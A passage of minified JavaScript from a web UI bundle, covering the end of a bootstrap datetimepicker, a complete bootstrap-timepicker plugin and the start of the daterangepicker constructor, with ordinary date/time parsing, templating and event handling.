}; if (C.M = C.MM = C.mm = C.m, C.dd = C.d, C.P = C.p, C.Z = C.z, t = w(t.getFullYear(), t.getMonth(), t.getDate(), t.getHours(), t.getMinutes(), t.getSeconds()), g.length === e.parts.length) { for (var l = 0, A = e.parts.length; l < A; l++) { if (c = parseInt(g[l], 10), u = e.parts[l], isNaN(c)) switch (u) { case "MM": I = G(S[n].months).filter(function () { var t = this.slice(0, g[l].length); return t === g[l].slice(0, t.length) }), c = G.inArray(I[0], S[n].months) + 1; break; case "M": I = G(S[n].monthsShort).filter(function () { var t = this.slice(0, g[l].length), e = g[l].slice(0, t.length); return t.toLowerCase() === e.toLowerCase() }), c = G.inArray(I[0], S[n].monthsShort) + 1; break; case "p": case "P": c = G.inArray(g[l].toLowerCase(), S[n].meridiem) }h[u] = c } for (var p, l = 0; l < d.length; l++)(p = d[l]) in h && !isNaN(h[p]) && C[p](t, h[p]) } return t }, formatDate: function (t, e, n, i, o) { if (null === t) return ""; var a; if ("standard" === i) a = { t: t.getTime(), yy: t.getUTCFullYear().toString().substring(2), yyyy: t.getUTCFullYear(), m: t.getUTCMonth() + 1, M: S[n].monthsShort[t.getUTCMonth()], MM: S[n].months[t.getUTCMonth()], d: t.getUTCDate(), D: S[n].daysShort[t.getUTCDay()], DD: S[n].days[t.getUTCDay()], p: 2 === S[n].meridiem.length ? S[n].meridiem[t.getUTCHours() < 12 ? 0 : 1] : "", h: t.getUTCHours(), i: t.getUTCMinutes(), s: t.getUTCSeconds(), z: o }, 2 === S[n].meridiem.length ? a.H = a.h % 12 == 0 ? 12 : a.h % 12 : a.H = a.h, a.HH = (a.H < 10 ? "0" : "") + a.H, a.P = a.p.toUpperCase(), a.Z = a.z, a.hh = (a.h < 10 ? "0" : "") + a.h, a.ii = (a.i < 10 ? "0" : "") + a.i, a.ss = (a.s < 10 ? "0" : "") + a.s, a.dd = (a.d < 10 ? "0" : "") + a.d, a.mm = (a.m < 10 ? "0" : "") + a.m; else { if ("php" !== i) throw new Error("Invalid format type."); (a = { y: t.getUTCFullYear().toString().substring(2), Y: t.getUTCFullYear(), F: S[n].months[t.getUTCMonth()], M: S[n].monthsShort[t.getUTCMonth()], n: t.getUTCMonth() + 1, t: k.getDaysInMonth(t.getUTCFullYear(), t.getUTCMonth()), j: t.getUTCDate(), l: S[n].days[t.getUTCDay()], D: S[n].daysShort[t.getUTCDay()], w: t.getUTCDay(), N: 0 === t.getUTCDay() ? 7 : t.getUTCDay(), S: t.getUTCDate() % 10 <= S[n].suffix.length ? S[n].suffix[t.getUTCDate() % 10 - 1] : "", a: 2 === S[n].meridiem.length ? S[n].meridiem[t.getUTCHours() < 12 ? 0 : 1] : "", g: t.getUTCHours() % 12 == 0 ? 12 : t.getUTCHours() % 12, G: t.getUTCHours(), i: t.getUTCMinutes(), s: t.getUTCSeconds() }).m = (a.n < 10 ? "0" : "") + a.n, a.d = (a.j < 10 ? "0" : "") + a.j, a.A = a.a.toString().toUpperCase(), a.h = (a.g < 10 ? "0" : "") + a.g, a.H = (a.G < 10 ? "0" : "") + a.G, a.i = (a.i < 10 ? "0" : "") + a.i, a.s = (a.s < 10 ? "0" : "") + a.s } for (var t = [], s = G.extend([], e.separators), r = 0, g = e.parts.length; r < g; r++)s.length && t.push(s.shift()), t.push(a[e.parts[r]]); return s.length && t.push(s.shift()), t.join("") }, convertViewMode: function (t) { switch (t) { case 4: case "decade": t = 4; break; case 3: case "year": t = 3; break; case 2: case "month": t = 2; break; case 1: case "day": t = 1; break; case 0: case "hour": t = 0 }return t }, headTemplate: '<thead><tr><th class="prev"><i class="{iconType} {leftArrow}"/></th><th colspan="5" class="switch"></th><th class="next"><i class="{iconType} {rightArrow}"/></th></tr></thead>', headTemplateV3: '<thead><tr><th class="prev"><span class="{iconType} {leftArrow}"></span> </th><th colspan="5" class="switch"></th><th class="next"><span class="{iconType} {rightArrow}"></span> </th></tr></thead>', contTemplate: '<tbody><tr><td colspan="7"></td></tr></tbody>', footTemplate: '<tfoot><tr><th colspan="7" class="today"></th></tr><tr><th colspan="7" class="clear"></th></tr></tfoot>' }; k.template = '<div class="datetimepicker"><div class="datetimepicker-minutes"><table class=" table-condensed">' + k.headTemplate + k.contTemplate + k.footTemplate + '</table></div><div class="datetimepicker-hours"><table class=" table-condensed">' + k.headTemplate + k.contTemplate + k.footTemplate + '</table></div><div class="datetimepicker-days"><table class=" table-condensed">' + k.headTemplate + "<tbody></tbody>" + k.footTemplate + '</table></div><div class="datetimepicker-months"><table class="table-condensed">' + k.headTemplate + k.contTemplate + k.footTemplate + '</table></div><div class="datetimepicker-years"><table class="table-condensed">' + k.headTemplate + k.contTemplate + k.footTemplate + "</table></div></div>", k.templateV3 = '<div class="datetimepicker"><div class="datetimepicker-minutes"><table class=" table-condensed">' + k.headTemplateV3 + k.contTemplate + k.footTemplate + '</table></div><div class="datetimepicker-hours"><table class=" table-condensed">' + k.headTemplateV3 + k.contTemplate + k.footTemplate + '</table></div><div class="datetimepicker-days"><table class=" table-condensed">' + k.headTemplateV3 + "<tbody></tbody>" + k.footTemplate + '</table></div><div class="datetimepicker-months"><table class="table-condensed">' + k.headTemplateV3 + k.contTemplate + k.footTemplate + '</table></div><div class="datetimepicker-years"><table class="table-condensed">' + k.headTemplateV3 + k.contTemplate + k.footTemplate + "</table></div></div>", G.fn.datetimepicker.DPGlobal = k, G.fn.datetimepicker.noConflict = function () { return G.fn.datetimepicker = X, this }, G(document).on("focus.datetimepicker.data-api click.datetimepicker.data-api", '[data-provide="datetimepicker"]', function (t) { var e = G(this); e.data("datetimepicker") || (t.preventDefault(), e.datetimepicker("show")) }), G(function () { G('[data-provide="datetimepicker-inline"]').datetimepicker() }) }), function (d, C, i) { "use strict"; function a(t, e) { this.widget = "", this.$element = d(t), this.defaultTime = e.defaultTime, this.disableFocus = e.disableFocus, this.disableMousewheel = e.disableMousewheel, this.isOpen = e.isOpen, this.minuteStep = e.minuteStep, this.modalBackdrop = e.modalBackdrop, this.orientation = e.orientation, this.secondStep = e.secondStep, this.snapToStep = e.snapToStep, this.showInputs = e.showInputs, this.showMeridian = e.showMeridian, this.showSeconds = e.showSeconds, this.template = e.template, this.appendWidgetTo = e.appendWidgetTo, this.showWidgetOnAddonClick = e.showWidgetOnAddonClick, this.icons = e.icons, this.maxHours = e.maxHours, this.explicitMode = e.explicitMode, this.handleDocumentClick = function (t) { var e = t.data.scope; e.$element.parent().find(t.target).length || e.$widget.is(t.target) || e.$widget.find(t.target).length || e.hideWidget() }, this._init() } a.prototype = { constructor: a, _init: function () { var t = this; this.showWidgetOnAddonClick && this.$element.parent().hasClass("input-group") && this.$element.parent().hasClass("bootstrap-timepicker") ? (this.$element.parent(".input-group.bootstrap-timepicker").find(".input-group-addon").on({ "click.timepicker": d.proxy(this.showWidget, this) }), this.$element.on({ "focus.timepicker": d.proxy(this.highlightUnit, this), "click.timepicker": d.proxy(this.highlightUnit, this), "keydown.timepicker": d.proxy(this.elementKeydown, this), "blur.timepicker": d.proxy(this.blurElement, this), "mousewheel.timepicker DOMMouseScroll.timepicker": d.proxy(this.mousewheel, this) })) : this.template ? this.$element.on({ "focus.timepicker": d.proxy(this.showWidget, this), "click.timepicker": d.proxy(this.showWidget, this), "blur.timepicker": d.proxy(this.blurElement, this), "mousewheel.timepicker DOMMouseScroll.timepicker": d.proxy(this.mousewheel, this) }) : this.$element.on({ "focus.timepicker": d.proxy(this.highlightUnit, this), "click.timepicker": d.proxy(this.highlightUnit, this), "keydown.timepicker": d.proxy(this.elementKeydown, this), "blur.timepicker": d.proxy(this.blurElement, this), "mousewheel.timepicker DOMMouseScroll.timepicker": d.proxy(this.mousewheel, this) }), !1 !== this.template ? this.$widget = d(this.getTemplate()).on("click", d.proxy(this.widgetClick, this)) : this.$widget = !1, this.showInputs && !1 !== this.$widget && this.$widget.find("input").each(function () { d(this).on({ "click.timepicker": function () { d(this).select() }, "keydown.timepicker": d.proxy(t.widgetKeydown, t), "keyup.timepicker": d.proxy(t.widgetKeyup, t) }) }), this.setDefaultTime(this.defaultTime) }, blurElement: function () { this.highlightedUnit = null, this.updateFromElementVal() }, clear: function () { this.hour = "", this.minute = "", this.second = "", this.meridian = "", this.$element.val("") }, decrementHour: function () { if (this.showMeridian) if (1 === this.hour) this.hour = 12; else { if (12 === this.hour) return this.hour--, this.toggleMeridian(); if (0 === this.hour) return this.hour = 11, this.toggleMeridian(); this.hour-- } else this.hour <= 0 ? this.hour = this.maxHours - 1 : this.hour-- }, decrementMinute: function (t) { var e = t ? this.minute - t : this.minute - this.minuteStep; e < 0 ? (this.decrementHour(), this.minute = 60 + e) : this.minute = e }, decrementSecond: function () { var t = this.second - this.secondStep; t < 0 ? (this.decrementMinute(!0), this.second = 60 + t) : this.second = t }, elementKeydown: function (t) { switch (t.which) { case 9: if (t.shiftKey) { if ("hour" === this.highlightedUnit) { this.hideWidget(); break } this.highlightPrevUnit() } else { if (this.showMeridian && "meridian" === this.highlightedUnit || this.showSeconds && "second" === this.highlightedUnit || !this.showMeridian && !this.showSeconds && "minute" === this.highlightedUnit) { this.hideWidget(); break } this.highlightNextUnit() } t.preventDefault(), this.updateFromElementVal(); break; case 27: this.updateFromElementVal(); break; case 37: t.preventDefault(), this.highlightPrevUnit(), this.updateFromElementVal(); break; case 38: switch (t.preventDefault(), this.highlightedUnit) { case "hour": this.incrementHour(), this.highlightHour(); break; case "minute": this.incrementMinute(), this.highlightMinute(); break; case "second": this.incrementSecond(), this.highlightSecond(); break; case "meridian": this.toggleMeridian(), this.highlightMeridian() }this.update(); break; case 39: t.preventDefault(), this.highlightNextUnit(), this.updateFromElementVal(); break; case 40: switch (t.preventDefault(), this.highlightedUnit) { case "hour": this.decrementHour(), this.highlightHour(); break; case "minute": this.decrementMinute(), this.highlightMinute(); break; case "second": this.decrementSecond(), this.highlightSecond(); break; case "meridian": this.toggleMeridian(), this.highlightMeridian() }this.update() } }, getCursorPosition: function () { var t = this.$element.get(0); if ("selectionStart" in t) return t.selectionStart; if (i.selection) { t.focus(); var e = i.selection.createRange(), n = i.selection.createRange().text.length; return e.moveStart("character", -t.value.length), e.text.length - n } }, getTemplate: function () { var t, e, n, i, o = this.showInputs ? (e = '<input type="text" class="bootstrap-timepicker-hour" maxlength="2"/>', n = '<input type="text" class="bootstrap-timepicker-minute" maxlength="2"/>', i = '<input type="text" class="bootstrap-timepicker-second" maxlength="2"/>', '<input type="text" class="bootstrap-timepicker-meridian" maxlength="2"/>') : (e = '<span class="bootstrap-timepicker-hour"></span>', n = '<span class="bootstrap-timepicker-minute"></span>', i = '<span class="bootstrap-timepicker-second"></span>', '<span class="bootstrap-timepicker-meridian"></span>'), a = '<table><tr><td><a href="#" data-action="incrementHour"><span class="' + this.icons.up + '"></span></a></td><td class="separator">&nbsp;</td><td><a href="#" data-action="incrementMinute"><span class="' + this.icons.up + '"></span></a></td>' + (this.showSeconds ? '<td class="separator">&nbsp;</td><td><a href="#" data-action="incrementSecond"><span class="' + this.icons.up + '"></span></a></td>' : "") + (this.showMeridian ? '<td class="separator">&nbsp;</td><td class="meridian-column"><a href="#" data-action="toggleMeridian"><span class="' + this.icons.up + '"></span></a></td>' : "") + "</tr><tr><td>" + e + '</td> <td class="separator">:</td><td>' + n + "</td> " + (this.showSeconds ? '<td class="separator">:</td><td>' + i + "</td>" : "") + (this.showMeridian ? '<td class="separator">&nbsp;</td><td>' + o + "</td>" : "") + '</tr><tr><td><a href="#" data-action="decrementHour"><span class="' + this.icons.down + '"></span></a></td><td class="separator"></td><td><a href="#" data-action="decrementMinute"><span class="' + this.icons.down + '"></span></a></td>' + (this.showSeconds ? '<td class="separator">&nbsp;</td><td><a href="#" data-action="decrementSecond"><span class="' + this.icons.down + '"></span></a></td>' : "") + (this.showMeridian ? '<td class="separator">&nbsp;</td><td><a href="#" data-action="toggleMeridian"><span class="' + this.icons.down + '"></span></a></td>' : "") + "</tr></table>"; switch (this.template) { case "modal": t = '<div class="bootstrap-timepicker-widget modal hide fade in" data-backdrop="' + (this.modalBackdrop ? "true" : "false") + '"><div class="modal-header"><a href="#" class="close" data-dismiss="modal">&times;</a><h3>Pick a Time</h3></div><div class="modal-content">' + a + '</div><div class="modal-footer"><a href="#" class="btn btn-primary" data-dismiss="modal">OK</a></div></div>'; break; case "dropdown": t = '<div class="bootstrap-timepicker-widget dropdown-menu">' + a + "</div>" }return t }, getTime: function () { return "" === this.hour ? "" : this.hour + ":" + (1 === this.minute.toString().length ? "0" + this.minute : this.minute) + (this.showSeconds ? ":" + (1 === this.second.toString().length ? "0" + this.second : this.second) : "") + (this.showMeridian ? " " + this.meridian : "") }, hideWidget: function () { !1 !== this.isOpen && (this.$element.trigger({ type: "hide.timepicker", time: { value: this.getTime(), hours: this.hour, minutes: this.minute, seconds: this.second, meridian: this.meridian } }), "modal" === this.template && this.$widget.modal ? this.$widget.modal("hide") : this.$widget.removeClass("open"), d(i).off("mousedown.timepicker, touchend.timepicker", this.handleDocumentClick), this.isOpen = !1, this.$widget.detach()) }, highlightUnit: function () { this.position = this.getCursorPosition(), 0 <= this.position && this.position <= 2 ? this.highlightHour() : 3 <= this.position && this.position <= 5 ? this.highlightMinute() : 6 <= this.position && this.position <= 8 ? this.showSeconds ? this.highlightSecond() : this.highlightMeridian() : 9 <= this.position && this.position <= 11 && this.highlightMeridian() }, highlightNextUnit: function () { switch (this.highlightedUnit) { case "hour": this.highlightMinute(); break; case "minute": this.showSeconds ? this.highlightSecond() : this.showMeridian ? this.highlightMeridian() : this.highlightHour(); break; case "second": this.showMeridian ? this.highlightMeridian() : this.highlightHour(); break; case "meridian": this.highlightHour() } }, highlightPrevUnit: function () { switch (this.highlightedUnit) { case "hour": this.showMeridian ? this.highlightMeridian() : this.showSeconds ? this.highlightSecond() : this.highlightMinute(); break; case "minute": this.highlightHour(); break; case "second": this.highlightMinute(); break; case "meridian": this.showSeconds ? this.highlightSecond() : this.highlightMinute() } }, highlightHour: function () { var t = this.$element.get(0), e = this; this.highlightedUnit = "hour", t.setSelectionRange && setTimeout(function () { e.hour < 10 ? t.setSelectionRange(0, 1) : t.setSelectionRange(0, 2) }, 0) }, highlightMinute: function () { var t = this.$element.get(0), e = this; this.highlightedUnit = "minute", t.setSelectionRange && setTimeout(function () { e.hour < 10 ? t.setSelectionRange(2, 4) : t.setSelectionRange(3, 5) }, 0) }, highlightSecond: function () { var t = this.$element.get(0), e = this; this.highlightedUnit = "second", t.setSelectionRange && setTimeout(function () { e.hour < 10 ? t.setSelectionRange(5, 7) : t.setSelectionRange(6, 8) }, 0) }, highlightMeridian: function () { var t = this.$element.get(0), e = this; this.highlightedUnit = "meridian", t.setSelectionRange && (this.showSeconds ? setTimeout(function () { e.hour < 10 ? t.setSelectionRange(8, 10) : t.setSelectionRange(9, 11) }, 0) : setTimeout(function () { e.hour < 10 ? t.setSelectionRange(5, 7) : t.setSelectionRange(6, 8) }, 0)) }, incrementHour: function () { if (this.showMeridian) { if (11 === this.hour) return this.hour++, this.toggleMeridian(); 12 === this.hour && (this.hour = 0) } return this.hour === this.maxHours - 1 ? void (this.hour = 0) : void this.hour++ }, incrementMinute: function (t) { var e = t ? this.minute + t : this.minute + this.minuteStep - this.minute % this.minuteStep; 59 < e ? (this.incrementHour(), this.minute = e - 60) : this.minute = e }, incrementSecond: function () { var t = this.second + this.secondStep - this.second % this.secondStep; 59 < t ? (this.incrementMinute(!0), this.second = t - 60) : this.second = t }, mousewheel: function (t) { if (!this.disableMousewheel) { t.preventDefault(), t.stopPropagation(); var e = t.originalEvent.wheelDelta || -t.originalEvent.detail, n = null; switch ("mousewheel" === t.type ? n = -1 * t.originalEvent.wheelDelta : "DOMMouseScroll" === t.type && (n = 40 * t.originalEvent.detail), n && (t.preventDefault(), d(this).scrollTop(n + d(this).scrollTop())), this.highlightedUnit) { case "minute": 0 < e ? this.incrementMinute() : this.decrementMinute(), this.highlightMinute(); break; case "second": 0 < e ? this.incrementSecond() : this.decrementSecond(), this.highlightSecond(); break; case "meridian": this.toggleMeridian(), this.highlightMeridian(); break; default: 0 < e ? this.incrementHour() : this.decrementHour(), this.highlightHour() }return !1 } }, changeToNearestStep: function (t, e) { return t % e == 0 ? t : Math.round(t % e / e) ? (t + (e - t % e)) % 60 : t - t % e }, place: function () { var t, e, n, i, o, a, s, r, g, l, c, I, u, h; this.isInline || (t = this.$widget.outerWidth(), e = this.$widget.outerHeight(), n = d(C).width(), i = d(C).height(), o = d(C).scrollTop(), a = parseInt(this.$element.parents().filter(function () { return "auto" !== d(this).css("z-index") }).first().css("z-index"), 10) + 10, s = this.component ? this.component.parent().offset() : this.$element.offset(), r = this.component ? this.component.outerHeight(!0) : this.$element.outerHeight(!1), g = this.component ? this.component.outerWidth(!0) : this.$element.outerWidth(!1), l = s.left, c = s.top, this.$widget.removeClass("timepicker-orient-top timepicker-orient-bottom timepicker-orient-right timepicker-orient-left"), "auto" !== this.orientation.x ? (this.$widget.addClass("timepicker-orient-" + this.orientation.x), "right" === this.orientation.x && (l -= t - g)) : (this.$widget.addClass("timepicker-orient-left"), s.left < 0 ? l -= s.left - 10 : s.left + t > n && (l = n - t - 10)), "auto" === (h = this.orientation.y) && (I = -o + s.top - e, u = o + i - (s.top + r + e), h = Math.max(I, u) === u ? "top" : "bottom"), this.$widget.addClass("timepicker-orient-" + h), "top" === h ? c += r : c -= e + parseInt(this.$widget.css("padding-top"), 10), this.$widget.css({ top: c, left: l, zIndex: a })) }, remove: function () { d("document").off(".timepicker"), this.$widget && this.$widget.remove(), delete this.$element.data().timepicker }, setDefaultTime: function (t) { var e, n, i, o, a; this.$element.val() ? this.updateFromElementVal() : "current" === t ? (n = (e = new Date).getHours(), i = e.getMinutes(), a = "AM", 0 === (o = e.getSeconds()) || 60 === (o = Math.ceil(e.getSeconds() / this.secondStep) * this.secondStep) && (i += 1, o = 0), 0 === i || 60 === (i = Math.ceil(e.getMinutes() / this.minuteStep) * this.minuteStep) && (n += 1, i = 0), this.showMeridian && (0 === n ? n = 12 : a = 12 <= n ? (12 < n && (n -= 12), "PM") : "AM"), this.hour = n, this.minute = i, this.second = o, this.meridian = a, this.update()) : !1 === t ? (this.hour = 0, this.minute = 0, this.second = 0, this.meridian = "AM") : this.setTime(t) }, setTime: function (t, e) { if (t) { var n, i, o, a, s, r; if ("object" == typeof t && t.getMonth) o = t.getHours(), a = t.getMinutes(), s = t.getSeconds(), this.showMeridian && (r = "AM", 12 < o && (r = "PM", o %= 12), 12 === o && (r = "PM")); else { if (2 < (n = (/a/i.test(t) ? 1 : 0) + (/p/i.test(t) ? 2 : 0))) return void this.clear(); if (o = (i = t.replace(/[^0-9\:]/g, "").split(":"))[0] ? i[0].toString() : i.toString(), this.explicitMode && 2 < o.length && o.length % 2 != 0) return void this.clear(); a = i[1] ? i[1].toString() : "", s = i[2] ? i[2].toString() : "", 4 < o.length && (s = o.slice(-2), o = o.slice(0, -2)), 2 < o.length && (a = o.slice(-2), o = o.slice(0, -2)), 2 < a.length && (s = a.slice(-2), a = a.slice(0, -2)), o = parseInt(o, 10), a = parseInt(a, 10), s = parseInt(s, 10), isNaN(o) && (o = 0), isNaN(a) && (a = 0), isNaN(s) && (s = 0), 59 < s && (s = 59), 59 < a && (a = 59), o >= this.maxHours && (o = this.maxHours - 1), this.showMeridian ? (12 < o && (n = 2, o -= 12), 0 === o && (o = 12), r = 1 === (n = n || 1) ? "AM" : "PM") : o < 12 && 2 === n ? o += 12 : o >= this.maxHours ? o = this.maxHours - 1 : (o < 0 || 12 === o && 1 === n) && (o = 0) } this.hour = o, this.snapToStep ? (this.minute = this.changeToNearestStep(a, this.minuteStep), this.second = this.changeToNearestStep(s, this.secondStep)) : (this.minute = a, this.second = s), this.meridian = r, this.update(e) } else this.clear() }, showWidget: function () { this.isOpen || this.$element.is(":disabled") || (this.$widget.appendTo(this.appendWidgetTo), d(i).on("mousedown.timepicker, touchend.timepicker", { scope: this }, this.handleDocumentClick), this.$element.trigger({ type: "show.timepicker", time: { value: this.getTime(), hours: this.hour, minutes: this.minute, seconds: this.second, meridian: this.meridian } }), this.place(), this.disableFocus && this.$element.blur(), "" === this.hour && (this.defaultTime ? this.setDefaultTime(this.defaultTime) : this.setTime("0:0:0")), "modal" === this.template && this.$widget.modal ? this.$widget.modal("show").on("hidden", d.proxy(this.hideWidget, this)) : !1 === this.isOpen && this.$widget.addClass("open"), this.isOpen = !0) }, toggleMeridian: function () { this.meridian = "AM" === this.meridian ? "PM" : "AM" }, update: function (t) { this.updateElement(), t || this.updateWidget(), this.$element.trigger({ type: "changeTime.timepicker", time: { value: this.getTime(), hours: this.hour, minutes: this.minute, seconds: this.second, meridian: this.meridian } }) }, updateElement: function () { this.$element.val(this.getTime()).change() }, updateFromElementVal: function () { this.setTime(this.$element.val()) }, updateWidget: function () { var t, e, n; !1 !== this.$widget && (t = this.hour, e = 1 === this.minute.toString().length ? "0" + this.minute : this.minute, n = 1 === this.second.toString().length ? "0" + this.second : this.second, this.showInputs ? (this.$widget.find("input.bootstrap-timepicker-hour").val(t), this.$widget.find("input.bootstrap-timepicker-minute").val(e), this.showSeconds && this.$widget.find("input.bootstrap-timepicker-second").val(n), this.showMeridian && this.$widget.find("input.bootstrap-timepicker-meridian").val(this.meridian)) : (this.$widget.find("span.bootstrap-timepicker-hour").text(t), this.$widget.find("span.bootstrap-timepicker-minute").text(e), this.showSeconds && this.$widget.find("span.bootstrap-timepicker-second").text(n), this.showMeridian && this.$widget.find("span.bootstrap-timepicker-meridian").text(this.meridian))) }, updateFromWidgetInputs: function () { var t; !1 !== this.$widget && (t = this.$widget.find("input.bootstrap-timepicker-hour").val() + ":" + this.$widget.find("input.bootstrap-timepicker-minute").val() + (this.showSeconds ? ":" + this.$widget.find("input.bootstrap-timepicker-second").val() : "") + (this.showMeridian ? this.$widget.find("input.bootstrap-timepicker-meridian").val() : ""), this.setTime(t, !0)) }, widgetClick: function (t) { t.stopPropagation(), t.preventDefault(); var e = d(t.target), n = e.closest("a").data("action"); n && this[n](), this.update(), e.is("input") && e.get(0).setSelectionRange(0, 2) }, widgetKeydown: function (t) { var e = d(t.target), n = e.attr("class").replace("bootstrap-timepicker-", ""); switch (t.which) { case 9: if (t.shiftKey) { if ("hour" === n) return this.hideWidget() } else if (this.showMeridian && "meridian" === n || this.showSeconds && "second" === n || !this.showMeridian && !this.showSeconds && "minute" === n) return this.hideWidget(); break; case 27: this.hideWidget(); break; case 38: switch (t.preventDefault(), n) { case "hour": this.incrementHour(); break; case "minute": this.incrementMinute(); break; case "second": this.incrementSecond(); break; case "meridian": this.toggleMeridian() }this.setTime(this.getTime()), e.get(0).setSelectionRange(0, 2); break; case 40: switch (t.preventDefault(), n) { case "hour": this.decrementHour(); break; case "minute": this.decrementMinute(); break; case "second": this.decrementSecond(); break; case "meridian": this.toggleMeridian() }this.setTime(this.getTime()), e.get(0).setSelectionRange(0, 2) } }, widgetKeyup: function (t) { (65 === t.which || 77 === t.which || 80 === t.which || 46 === t.which || 8 === t.which || 48 <= t.which && t.which <= 57 || 96 <= t.which && t.which <= 105) && this.updateFromWidgetInputs() } }, d.fn.timepicker = function (i) { var o = Array.apply(null, arguments); return o.shift(), this.each(function () { var t = d(this), e = t.data("timepicker"), n = "object" == typeof i && i; e || t.data("timepicker", e = new a(this, d.extend({}, d.fn.timepicker.defaults, n, d(this).data()))), "string" == typeof i && e[i].apply(e, o) }) }, d.fn.timepicker.defaults = { defaultTime: "current", disableFocus: !1, disableMousewheel: !1, isOpen: !1, minuteStep: 15, modalBackdrop: !1, orientation: { x: "auto", y: "auto" }, secondStep: 15, snapToStep: !1, showSeconds: !1, showInputs: !0, showMeridian: !0, template: "dropdown", appendWidgetTo: "body", showWidgetOnAddonClick: !0, icons: { up: "glyphicon glyphicon-chevron-up", down: "glyphicon glyphicon-chevron-down" }, maxHours: 24, explicitMode: !1 }, d.fn.timepicker.Constructor = a, d(i).on("focus.timepicker.data-api click.timepicker.data-api", '[data-provide="timepicker"]', function (t) { var e = d(this); e.data("timepicker") || (t.preventDefault(), e.timepicker()) }) }(jQuery, window, document), $.fn.timepicker.defaults = $.extend(!0, {}, $.fn.timepicker.defaults, { icons: { up: "la la-angle-up", down: "la la-angle-down" } }), function (t, n) { var e, i; "function" == typeof define && define.amd ? define(["moment", "jquery"], function (t, e) { return e.fn || (e.fn = {}), "function" != typeof t && t.default && (t = t.default), n(t, e) }) : "object" == typeof module && module.exports ? ((e = "undefined" != typeof window ? window.jQuery : void 0) || (e = require("jquery")).fn || (e.fn = {}), i = "undefined" != typeof window && void 0 !== window.moment ? window.moment : require("moment"), module.exports = n(i, e)) : t.daterangepicker = n(t.moment, t.jQuery) }(this, function (H, E) { function i(t, e, n) { var i, o, a, s, r; if (this.parentEl = "body", this.element = E(t), this.startDate = H().startOf("day"), this.endDate = H().endOf("day"), this.minDate = !1, this.maxDate = !1, this.maxSpan = !1, this.autoApply = !1, this.singleDatePicker = !1, this.showDropdowns = !1, this.minYear = H().subtract(100, "year").format("YYYY"), this.maxYear = H().add(100, "year").format("YYYY"), this.showWeekNumbers = !1, this.showISOWeekNumbers = !1, this.showCustomRangeLabel = !0, this.timePicker = !1, this.timePicker24Hour = !1, this.timePickerIncrement = 1, this.timePickerSeconds = !1, this.linkedCalendars = !0, this.autoUpdateInput = !0, this.alwaysShowCalendars = !1, this.ranges = {}, this.opens = "right", this.element.hasClass("pull-right") && (this.opens = "left"), this.drops = "down", this.element.hasClass("dropup") && (this.drops = "up"), this.buttonClasses = "btn btn-sm", this.applyButtonClasses = "btn-primary", this.cancelButtonClasses = "btn-default", this.locale = { direction: "ltr", format: H.localeData().longDateFormat("L"), separator: " - ", applyLabel: "Apply", cancelLabel: "Cancel", weekLabel: "W", customRangeLabel: "Custom Range", daysOfWeek: H.weekdaysMin(), monthNames: H.monthsShort(), firstDay: H.localeData().firstDayOfWeek() }, this.callback = function () { }, this.isShowing = !1, this.leftCalendar = {}, this.rightCalendar = {}, "object" == typeof e && null !== e || (e = {}), "string" == typeof (e = E.extend(this.element.data(), e)).template || e.template instanceof E || (e.template = '<div class="daterangepicker"><div class="ranges"></div><div class="drp-calendar left"><div class="calendar-table"></div><div class="calendar-time"></div></div><div class="drp-calendar right"><div class="calendar-table"></div><div class="calendar-time"></div></div><div class="drp-buttons"><span class="drp-selected"></span><button class="cancelBtn" type="button"></button><button class="applyBtn" disabled="disabled" type="button"></button> </div></div>'), this.parentEl = e.parentEl && E(e.parentEl).length ? E(e.parentEl) : E(this.parentEl), this.container = E(e.template).appendTo(this.parentEl), "object" == typeof e.locale && ("string" == typeof e.locale.direction && (this.locale.direction = e.locale.direction), "string" == typeof e.locale.format && (this.locale.format = e.locale.format), "string" == typeof e.locale.separator && (this.locale.separator = e.locale.separator), "object" == typeof e.locale.daysOfWeek && (this.locale.daysOfWeek = e.locale.daysOfWeek.slice()), "object" == typeof e.locale.monthNames && (this.locale.monthNames = e.locale.monthNames.slice()), "number" == typeof e.locale.firstDay && (this.locale.firstDay = e.locale.firstDay), "string" == typeof e.locale.applyLabel && (this.locale.applyLabel = e.locale.applyLabel), "string" == typeof e.locale.cancelLabel && (this.locale.cancelLabel = e.locale.cancelLabel), "string" == typeof e.locale.weekLabel && (this.locale.weekLabel = e.locale.weekLabel), "string" == typeof e.locale.customRangeLabel && ((l = document.createElement("textarea")).innerHTML = e.locale.customRangeLabel, c = l.value, this.locale.customRangeLabel = c)), this.container.addClass(this.locale.direction), "string" == typeof e.startDate && (this.startDate = H(e.startDate, this.locale.format)), "string" == typeof e.endDate && (this.endDate = H(e.endDate, this.locale.format)), "string" == typeof e.minDate && (this.minDate = H(e.minDate, this.locale.format)), "string" == typeof e.maxDate && (this.maxDate = H(e.maxDate, this.locale.format)), "object" == typeof e.startDate && (this.startDate = H(e.startDate)), "object" == typeof e.endDate && (this.endDate = H(e.endDate)), "object" == typeof e.minDate && (this.minDate = H(e.minDate)), "object" == typeof e.maxDate && (this.maxDate = H(e.maxDate)), this.minDate && this.startDate.isBefore(this.minDate) && (this.startDate = this.minDate.clone()), this.maxDate && this.endDate.isAfter(this.maxDate) && (this.endDate = this.maxDate.clone()), "string" == typeof e.applyButtonClasses && (this.applyButtonClasses = e.applyButtonClasses), "string" == typeof e.applyClass && (this.applyButtonClasses = e.applyClass), "string" == typeof e.cancelButtonClasses && (this.cancelButtonClasses = e.cancelButtonClasses), "string" == typeof e.cancelClass && (this.cancelButtonClasses = e.cancelClass), "object" == typeof e.maxSpan && (this.maxSpan = e.maxSpan), "object" == typeof e.dateLimit && (this.maxSpan = e.dateLimit), "string" == typeof e.opens && (this.opens = e.opens), "string" == typeof e.drops && (this.drops = e.drops), "boolean" == typeof e.showWeekNumbers && (this.showWeekNumbers = e.showWeekNumbers), "boolean" == typeof e.showISOWeekNumbers && (this.showISOWeekNumbers = e.showISOWeekNumbers), "string" == typeof e.buttonClasses && (this.buttonClasses = e.buttonClasses), "object" == typeof e.buttonClasses && (this.buttonClasses = e.buttonClasses.join(" ")), "boolean" == typeof e.showDropdowns && (this.showDropdowns = e.showDropdowns), "number" == typeof e.minYear && (this.minYear = e.minYear), "number" == typeof e.maxYear && (this.maxYear = e.maxYear), "boolean" == typeof e.showCustomRangeLabel && (this.showCustomRangeLabel = e.showCustomRangeLabel), "boolean" == typeof e.singleDatePicker && (this.singleDatePicker = e.singleDatePicker, this.singleDatePicker && (this.endDate = this.startDate.clone())), "boolean" == typeof e.timePicker && (this.timePicker = e.timePicker), "boolean" == typeof e.timePickerSeconds && (this.timePickerSeconds = e.timePickerSeconds), "number" == typeof e.timePickerIncrement && (this.timePickerIncrement = e.timePickerIncrement), "boolean" == typeof 